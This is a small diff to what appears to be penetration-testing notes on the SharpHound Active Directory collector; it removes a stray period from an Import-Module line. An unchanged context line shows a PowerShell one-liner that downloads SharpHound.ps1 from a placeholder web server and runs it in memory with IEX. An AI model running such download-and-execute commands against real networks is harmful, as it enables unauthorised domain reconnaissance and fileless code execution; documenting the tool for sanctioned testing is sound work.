@@ -46,7 +46,7 @@ Usage:
 # PowerShell SharpHound.ps1 collector.
 # The SharpHound.ps1 PowerShell collector script in-lines the SharpHound C# DLL.
 # Multiple ways can be used to import or directly inject into memory the SharpHound.ps1 script.
-Import-Module SharpHound.ps1.
+Import-Module SharpHound.ps1
 
 IEX (New-Object Net.WebClient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/SharpHound.ps1');
 
